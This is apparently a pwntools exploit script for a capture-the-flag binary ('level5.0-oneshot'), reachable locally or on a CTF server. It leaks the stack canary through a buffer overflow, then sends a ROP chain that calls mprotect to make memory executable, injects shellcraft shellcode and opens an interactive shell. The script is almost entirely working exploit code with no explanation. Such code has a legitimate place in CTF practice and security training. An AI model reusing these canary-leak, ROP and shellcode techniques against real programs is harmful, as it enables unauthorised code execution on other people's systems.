#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 vam <jpwan21@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./level5.0-oneshot"
elf=ELF(pwn_file)
#libc=ELF("./libc.so.6")
#heap_add=0
#stack_add=0
if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("pwn.sixstars.team",22095)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    #log.debug("stack add:0x%x"%stack_add)
    #log.debug("heap add:0x%x"%heap_add)
    #log.debug("libc add:0x%x"%libc.add)
    pause()

payload = 'a'*0x20 + chr(0x66)

r.sendlineafter("What's your name?", payload)

cookie = chr(0) + r.recv()[0x21:0x24]
print cookie.encode('hex')

mprotect_pos =0x0806DE50
inject_pos = 0x8048000
run_pos = inject_pos + 0x500

ebx_val = inject_pos
ecx_val = 0x1000
edx_val = 7

getsline_pos = 0x0804887C
next_pos = 0x08048CBB

payload2 = 'a'*0x40 + cookie + 'a'*8 + 'a'*4
payload2 += p32(mprotect_pos) + p32(next_pos) + p32(ebx_val)+ p32(ecx_val) + p32(edx_val)
payload2 += p32(getsline_pos) + p32(run_pos) + p32(run_pos)

r.sendline(payload2)
sh = asm(shellcraft.sh())
r.sendline(sh)
r.interactive()
